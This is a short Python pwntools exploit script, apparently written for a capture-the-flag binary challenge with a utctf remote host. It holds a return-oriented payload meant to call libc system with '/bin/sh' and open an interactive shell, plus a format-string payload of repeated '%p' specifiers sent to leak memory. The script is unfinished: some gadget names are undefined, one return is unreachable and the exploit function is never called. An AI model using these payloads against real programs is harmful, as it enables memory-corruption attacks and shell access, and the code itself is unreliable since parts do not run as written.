from pwn import *
import os
import random
import time

# libc = ELF('./libc-2.24.so')


context.binary =f'./1.bin'
elf=context.binary

context.log_level = "DEBUG"

gs = '''
'''


def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)
        return remote('pwn.utctf.live',int('5002'))

print(elf.plt)
print(elf.symbols)

def exploit(elf,libc,p,puerto,password):
    p.recvuntil('-------------------------------------------------------------------')
    p.recvuntil('Proceeding to the challenge...')
    p.sendline(b'A'*9+p64(POP_RDI)+p64(BINSH)+p64(libc.symbols['system'])+p64(mAin))
    p.interactive()



def dump_binary():
    p=start()
    p.sendlineafter('first binary.\n', 'A')
    dump=p.recvuntil('\n\n\n')[:-2]
    print(dump)
    f=open(f"binary_{1}.txt","wb")
    f.write(dump)
    os.system(f'xxd -r binary_{1}.txt binary_{1}')
    p.interactive()



def get_message(p):
    pass




# dump_binary()


# exploit(elf,libc,p,rrr,pzw)
p=start()
payload = b""
# payload += b"\x41\x42\x43\x44\x45\x00\x00\x48\x00\x00\x40\x00\x5C\x54\x55\x40"
payload += b"%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%pp%p%p%p%p%p%p%p%pp%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p"
p.sendline(payload)
p.interactive()



